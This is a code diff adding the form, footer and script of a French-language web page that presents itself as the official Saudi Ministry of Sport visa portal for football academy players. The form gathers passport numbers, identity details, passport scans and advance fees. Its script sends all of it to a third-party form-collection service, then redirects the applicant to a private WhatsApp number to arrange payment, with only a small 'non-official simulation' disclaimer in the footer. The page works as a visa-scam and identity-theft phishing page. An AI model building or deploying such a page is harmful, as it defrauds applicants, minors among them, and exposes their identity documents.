+          <div class="visa-card-footer"><div class="tag-list"><span class="tag green">Court séjour</span><span class="tag">Multi-entrées</span><span class="tag">Groupes</span></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PROCESS -->
+<section class="process-section">
+  <div class="section-inner">
+    <div class="section-header">
+      <div class="section-tag">Procédure</div>
+      <h2>Comment Soumettre Votre Demande ?</h2>
+      <p>Un parcours simplifié en 5 étapes pour obtenir votre visa sportif saoudien.</p>
+    </div>
+    <div class="process-steps">
+      <div class="step"><div class="step-num">1</div><h4>Créer un Compte</h4><p>Inscription sur le portail officiel</p></div>
+      <div class="step"><div class="step-num">2</div><h4>Choisir le Visa</h4><p>Sélectionner le programme adapté</p></div>
+      <div class="step highlight"><div class="step-num">3</div><h4>Dossier Complet</h4><p>Téléverser les documents requis</p></div>
+      <div class="step"><div class="step-num">4</div><h4>Paiement des Frais</h4><p>Règlement sécurisé en ligne</p></div>
+      <div class="step"><div class="step-num">5</div><h4>Approbation & Visa</h4><p>Réception par email</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- DOCUMENTS -->
+<section class="docs-section" id="documents">
+  <div class="section-inner">
+    <div class="section-header">
+      <div class="section-tag">Documents Requis</div>
+      <h2>Préparez Votre Dossier</h2>
+      <p>Documents obligatoires pour le visa Football Académique.</p>
+    </div>
+    <div class="docs-grid">
+      <div class="docs-list">
+        <div class="doc-item"><div class="doc-num">1</div><div class="doc-text"><strong>Passeport valide</strong><span>Validité 6 mois après départ, 2 pages vierges.</span><span class="doc-required">Obligatoire</span></div></div>
+        <div class="doc-item"><div class="doc-num">2</div><div class="doc-text"><strong>Lettre d'Acceptation</strong><span>De l'académie accréditée par le Ministère du Sport KSA.</span><span class="doc-required">Obligatoire</span></div></div>
+        <div class="doc-item"><div class="doc-num">3</div><div class="doc-text"><strong>Contrat de Formation</strong><span>Signé par le joueur (ou représentants légaux) et l'académie.</span><span class="doc-required">Obligatoire</span></div></div>
+        <div class="doc-item"><div class="doc-num">4</div><div class="doc-text"><strong>Certificat Médical</strong><span>Aptitude sportive avec ECG et tests biologiques.</span><span class="doc-required">Obligatoire</span></div></div>
+        <div class="doc-item"><div class="doc-num">5</div><div class="doc-text"><strong>Autorisation Parentale</strong><span>Notariée et traduite pour les mineurs.</span><span class="doc-required">Mineurs</span></div></div>
+        <div class="doc-item"><div class="doc-num">6</div><div class="doc-text"><strong>Attestation Fédération</strong><span>Non-opposition de la fédération nationale (FIFA RSTP).</span><span class="doc-required">Obligatoire</span></div></div>
+        <div class="doc-item"><div class="doc-num">7</div><div class="doc-text"><strong>Preuve Financière</strong><span>Relevé bancaire ou lettre de garantie.</span><span class="doc-required">Obligatoire</span></div></div>
+        <div class="doc-item"><div class="doc-num">8</div><div class="doc-text"><strong>Photos d'identité</strong><span>2 photos biométriques 4×4cm fond blanc.</span><span class="doc-required">Obligatoire</span></div></div>
+      </div>
+      <div>
+        <div class="docs-panel">
+          <h3>Visa Football Académique</h3>
+          <p>Informations pratiques pour les candidatures en cours pour la saison 2024–2025.</p>
+          <div class="panel-stat"><span>Délai de traitement</span><strong>7 – 12 jours</strong></div>
+          <div class="panel-stat"><span>Frais consulaires</span><strong>300 – 650 SAR</strong></div>
+          <div class="panel-stat"><span>Durée du visa</span><strong>3 mois – 2 ans</strong></div>
+          <div class="panel-stat"><span>Entrées autorisées</span><strong>Simple / Multiple</strong></div>
+          <div class="panel-stat"><span>Taux d'approbation</span><strong>94 % (2023–24)</strong></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FORMULAIRE -->
+<section class="form-section" id="formulaire">
+  <div class="section-inner">
+    <div class="section-header">
+      <div class="section-tag">Formulaire Officiel</div>
+      <h2>Déposer une Demande de Visa</h2>
+      <p>Remplissez le formulaire ci-dessous et cliquez sur Soumettre mon visa. Vos données seront envoyées en toute sécurité.</p>
+    </div>
+    <div class="form-card">
+      <form id="visa-form" class="form-body">
+        <div class="form-row three">
+          <div class="form-group">
+            <label>Nom de Famille <span>*</span></label>
+            <input type="text" placeholder="DUPONT" id="nom" name="nom" required>
+          </div>
+          <div class="form-group">
+            <label>Prénom(s) <span>*</span></label>
+            <input type="text" placeholder="Jean-Michel" id="prenom" name="prenom" required>
+          </div>
+          <div class="form-group">
+            <label>Date de Naissance <span>*</span></label>
+            <input type="date" id="naissance" name="naissance" required>
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Nationalité <span>*</span></label>
+            <select id="nationalite" name="nationalite" required>
+              <option value="">— Sélectionner —</option>
+              <option>Française</option>
+              <option>Belge</option>
+              <option>Sénégalaise</option>
+              <option>Ivoirienne</option>
+              <option>Marocaine</option>
+              <option>Congolaise (RDC)</option>
+              <option>Camerounaise</option>
+              <option>Gabonaise</option>
+              <option>Tchadienne</option>
+              <option>Centrafricaine</option>
+              <option>Autre</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Numéro de Passeport <span>*</span></label>
+            <input type="text" placeholder="XX 0000000" id="passport" name="passport" required>
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Expiration du Passeport <span>*</span></label>
+            <input type="date" id="passport-exp" name="passport_exp" required>
+          </div>
+          <div class="form-group">
+            <label>Adresse Email <span>*</span></label>
+            <input type="email" placeholder="jean@exemple.com" id="email" name="email" required>
+          </div>
+        </div>
+
+        <div class="form-divider">Programme de Formation</div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Type de Visa <span>*</span></label>
+            <select id="visa-type-select" name="visa_type" required>
+              <option>Visa Football Académique</option>
+              <option>Visa Académique Sportif</option>
+              <option>Visa Stage Court Séjour</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Académie / Institution <span>*</span></label>
+            <select name="academie" required>
+              <option value="">— Sélectionner —</option>
+              <option>Al-Nassr Academy — Riyadh</option>
+              <option>Al-Hilal Academy — Riyadh</option>
+              <option>Al-Ittihad Academy — Jeddah</option>
+              <option>Saudi Football Federation Academy</option>
+              <option>Neom Sport Academy</option>
+              <option>Autre institution agréée</option>
+            </select>
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Date de Début <span>*</span></label>
+            <input type="date" id="date-debut" name="date_debut" required>
+          </div>
+          <div class="form-group">
+            <label>Durée Prévue <span>*</span></label>
+            <select id="duree" name="duree" required>
+              <option>3 mois</option>
+              <option>6 mois</option>
+              <option>12 mois</option>
+              <option>18 mois</option>
+              <option>24 mois</option>
+            </select>
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group full">
+            <label>Poste / Profil Sportif</label>
+            <input type="text" placeholder="ex. Attaquant · U18 · Niveau régional / national" id="profil" name="profil">
+          </div>
+        </div>
+
+        <div class="form-divider">Modalités de Règlement</div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Type de Règlement <span>*</span></label>
+            <select id="payment-type" name="reglement_type" required onchange="document.getElementById('amount-group').style.display = this.value === 'avance' ? 'flex' : 'none'">
+              <option value="complet">Payer le montant complet</option>
+              <option value="avance">Payer une avance</option>
+            </select>
+          </div>
+          <div class="form-group" id="amount-group" style="display:none;">
+            <label>Montant de l'avance (USD) <span>*</span></label>
+            <input type="number" id="payment-amount" name="reglement_montant" placeholder="ex: 150" min="1">
+          </div>
+        </div>
+
+        <div class="form-divider">Téléversement des Documents</div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Passeport (scan recto/verso) <span>*</span></label>
+            <input type="file" name="document_passeport" id="input-passeport" accept=".pdf,.jpg,.jpeg,.png" style="display:none" onchange="updateFileName(this, 'zone-passeport', 'file-name-passeport')" required>
+            <div class="upload-zone" id="zone-passeport" onclick="document.getElementById('input-passeport').click()">
+              <div style="font-size:24px">📄</div>
+              <p><strong>Cliquer pour sélectionner le fichier</strong><br>PDF, JPG, PNG · max 5 MB</p>
+            </div>
+            <span class="file-name" id="file-name-passeport"></span>
+          </div>
+          <div class="form-group">
+            <label>Lettre d'Acceptation Académie <span>*</span></label>
+            <input type="file" name="document_acceptation" id="input-acceptation" accept=".pdf,.jpg,.jpeg,.png" style="display:none" onchange="updateFileName(this, 'zone-acceptation', 'file-name-acceptation')" required>
+            <div class="upload-zone" id="zone-acceptation" onclick="document.getElementById('input-acceptation').click()">
+              <div style="font-size:24px">🏟️</div>
+              <p><strong>Cliquer pour sélectionner le fichier</strong><br>PDF, JPG, PNG · max 5 MB</p>
+            </div>
+            <span class="file-name" id="file-name-acceptation"></span>
+          </div>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submit-visa">🎯 SOUMETTRE MON VISA</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- INFO BANNER -->
+<div class="info-banner">
+  <div class="info-banner-inner">
+    <p><strong>📋 Joueurs Mineurs (–18 ans) :</strong> Autorisation parentale notariée et tutelle légale sur place obligatoires.</p>
+    <a href="#">En savoir plus →</a>
+  </div>
+</div>
+
+<!-- PARTNERS -->
+<div class="partners-section" id="partenaires">
+  <div class="partners-inner">
+    <div class="partners-label">Institutions & Fédérations Partenaires</div>
+    <div class="partners-row">
+      <div class="partner-badge"><div class="partner-logo-box">⚽</div><span>FIFA</span></div>
+      <div class="partner-badge"><div class="partner-logo-box">🌏</div><span>AFC</span></div>
+      <div class="partner-badge"><div class="partner-logo-box">🏴</div><span>SAFF</span></div>
+      <div class="partner-badge"><div class="partner-logo-box">🏟️</div><span>SPL</span></div>
+      <div class="partner-badge"><div class="partner-logo-box">🎓</div><span>KSU Sport</span></div>
+      <div class="partner-badge"><div class="partner-logo-box">🌐</div><span>Vision 2030</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-grid">
+    <div class="footer-brand">
+      <div class="logo-group">
+        <div class="logo-emblem">🏴</div>
+        <div class="logo-text"><strong>KSA Sport Visa Portal</strong><span>Ministry of Sport · Vision 2030</span></div>
+      </div>
+      <p>Portail officiel de demande de visa sportif et académique pour le Royaume d'Arabie Saoudite.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Types de Visa</h4>
+      <ul><li><a href="#">Football Académique</a></li><li><a href="#">Académique Sportif</a></li><li><a href="#">Stage Court Séjour</a></li><li><a href="#">Visa Entraîneur</a></li><li><a href="#">Visa Dirigeant Club</a></li></ul>
+    </div>
+    <div class="footer-col">
+      <h4>Ressources</h4>
+      <ul><li><a href="#">Guide du Demandeur</a></li><li><a href="#">Académies Agréées</a></li><li><a href="#">Règlement FIFA RSTP</a></li><li><a href="#">FAQ</a></li><li><a href="#">Support</a></li></ul>
+    </div>
+    <div class="footer-col">
+      <h4>Légal</h4>
+      <ul><li><a href="#">Conditions Générales</a></li><li><a href="#">Confidentialité</a></li><li><a href="#">Mentions Légales</a></li><li><a href="#">Cookies</a></li><li><a href="#">Accessibilité</a></li></ul>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <p>© 2024 Royaume d'Arabie Saoudite — Ministère du Sport. Simulation non-officielle.</p>
+    <div class="footer-lang"><a href="#" class="active">FR</a><a href="#">EN</a><a href="#">AR</a></div>
+  </div>
+</footer>
+
+<script>
+  const FORMSPREE_URL = 'https://formspree.io/f/mkoqvnjy';
+  const WHATSAPP_NUMBER = '33673988016';
+
+  function selectVisa(el) {
+    document.querySelectorAll('.visa-type-item').forEach(i => i.classList.remove('selected'));
+    el.classList.add('selected');
+  }
+
+  function updateFileName(input, zoneId, nameId) {
+    const nameSpan = document.getElementById(nameId);
+    const zone = document.getElementById(zoneId);
+    if (input.files && input.files.length > 0) {
+      nameSpan.textContent = input.files[0].name;
+      zone.querySelector('p').innerHTML = `<strong>${input.files[0].name}</strong><br>Cliquer pour changer`;
+    } else {
+      nameSpan.textContent = '';
+      zone.querySelector('p').innerHTML = '<strong>Cliquer pour sélectionner le fichier</strong><br>PDF, JPG, PNG · max 5 MB';
+    }
+  }
+
+  document.getElementById('visa-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const submitBtn = document.getElementById('submit-visa');
+    submitBtn.disabled = true;
+    submitBtn.textContent = '⏳ Envoi en cours...';
+
+    const formData = new FormData(e.target);
+
+    try {
+      const response = await fetch(FORMSPREE_URL, {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      });
+
+      if (response.ok) {
+        const nom = formData.get('nom') || 'Non renseigné';
+        const prenom = formData.get('prenom') || 'Non renseigné';
+        const naissance = formData.get('naissance') || 'Non renseignée';
+        const nationalite = formData.get('nationalite') || 'Non renseignée';
+        const passport = formData.get('passport') || 'Non renseigné';
+        const email = formData.get('email') || 'Non renseigné';
+        const visaType = formData.get('visa_type') || 'Non renseigné';
+        const paymentType = formData.get('reglement_type');
+        const paymentAmount = formData.get('reglement_montant');
+        const paymentDetail = paymentType === 'avance' ? `Avance de ${paymentAmount || '0'} USD` : 'Paiement complet des frais de visa';
+
+        const message = `Bonjour, je soumets ma demande de visa sportif KSA.\n\n` +
+          `*Mes informations :*\n` +
+          `- Nom : ${nom}\n` +
+          `- Prénom : ${prenom}\n` +
+          `- Date de naissance : ${naissance}\n` +
+          `- Nationalité : ${nationalite}\n` +
+          `- Passeport : ${passport}\n` +
+          `- Email : ${email}\n` +
+          `- Type de visa : ${visaType}\n\n` +
+          `*Règlement :* ${paymentDetail}\n\n` +
+          `Les documents joints ont été transmis avec succès.\n` +
+          `Merci de me confirmer la procédure pour le paiement.`;
+
+        window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`, '_blank');
+
+        e.target.reset();
+        document.getElementById('amount-group').style.display = 'none';
+        document.getElementById('file-name-passeport').textContent = '';
+        document.getElementById('file-name-acceptation').textContent = '';
+        document.getElementById('zone-passeport').querySelector('p').innerHTML = '<strong>Cliquer pour sélectionner le fichier</strong><br>PDF, JPG, PNG · max 5 MB';
+        document.getElementById('zone-acceptation').querySelector('p').innerHTML = '<strong>Cliquer pour sélectionner le fichier</strong><br>PDF, JPG, PNG · max 5 MB';
+      } else {
+        throw new Error('Erreur serveur');
+      }
+    } catch (error) {
+      alert('Une erreur est survenue lors de l\'envoi. Veuillez réessayer.');
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.textContent = '🎯 SOUMETTRE MON VISA';
+    }
+  });
+</script>
+
+</body>
+</html>
